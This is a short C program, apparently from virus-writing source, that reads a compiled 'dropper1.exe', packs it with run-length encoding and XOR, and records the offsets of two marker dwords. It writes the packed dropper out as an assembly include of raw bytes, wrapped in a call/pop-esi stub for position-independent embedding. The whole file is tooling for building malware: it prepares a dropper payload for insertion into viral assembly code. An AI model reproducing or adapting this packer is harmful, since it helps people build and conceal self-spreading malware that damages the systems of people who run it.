   // DROPPER1.EXE --> DROPPER1.INC convertor/packer

   #include <stdio.h>
   #include <stdlib.h>
   #include <dos.h>
   #include <dir.h>
   #include <io.h>
   #include <assert.h>
   #include <memory.h>

   #define ifile "dropper1.exe"
   #define ofile "dropper1.inc"

   void main()
   {
     printf("þ reading %s...\n", ifile);

     FILE*f=fopen(ifile,"rb");
     assert(f);
     int ilen = filelength(fileno(f));
     unsigned char* ibuf = (char*)calloc(1,ilen);
     fread(ibuf, 1,ilen, f);
     fclose(f);

     printf("þ packing...\n");

     int fuck = 0;
     for (int i=0; i<ilen; i++)
       if (*(unsigned long*)&ibuf[i]=='FUCK')
       {
         fuck = i;
         *(unsigned long*)&ibuf[i]=0;
         break;
       }

     int xpeh = 0;
     for (int i=0; i<ilen; i++)
       if (*(unsigned long*)&ibuf[i]=='XPEH')
       {
         xpeh = i;
         *(unsigned long*)&ibuf[i]=0;
         break;
       }

     unsigned char* obuf = (char*)calloc(1,ilen+8192);
     int olen = 0;

     int i=0, k=0, c;

     olen+=4;

     do
     {
       c = 0;
       while ( (i+c<ilen) &&
               ( (ibuf[i+c+0]!=0) ||
                 (ibuf[i+c+1]!=0) ||
                 (ibuf[i+c+2]!=0) ) ) c++;
       if (c>255) printf("*");
       obuf[olen++] = c;
       while (c) { obuf[olen++] = ibuf[i++]^c; c--; };
       c = 0;
       while ((i+c<ilen)&&(ibuf[i+c]==0)) c++;
       if (c>65535) printf("*");
       obuf[olen++] = c&255;
       obuf[olen++] = c>>8;
       i += c;
       k++;
     } while (i<ilen);

     *(unsigned long*)&obuf[0] = k;

     printf("þ writing %s...\n", ofile);

     f = fopen(ofile,"wb");
     assert(f);
     fprintf(f, "; GENERATED FILE. DO NOT EDIT!\n\n");

     fprintf(f, "DROPPER_PACKED_SIZE     equ     0%08Xh  ; %i\n", olen,olen);
     fprintf(f, "DROPPER_UNPACKED_SIZE   equ     0%08Xh  ; %i\n", ilen,ilen);
     fprintf(f, "DROPPER_INSERT_OFFS     equ     0%08Xh  ; %i\n", fuck,fuck);
     fprintf(f, "DROPPER_INSERT_ID       equ     0%08Xh  ; %i\n\n", xpeh,xpeh);

     fprintf(f, "get_dropper_code:       call    __pop_esi\n\n", olen);

     for (int i=0; i<olen; i++)
     {
       if ((i%16)==0) fprintf(f,"db "); else fprintf(f,",");
       fprintf(f, "0%02Xh",obuf[i]);
       if ((i%16)==15)
       {
         fprintf(f," ; %04X\n",i-15);
       }
       else
         if (i==olen-1)
           fprintf(f,"\n");
     }

     fprintf(f, "\n__pop_esi:              pop     esi\n", olen);
     fprintf(f, "                        retn\n", olen);
     fclose(f);

   }
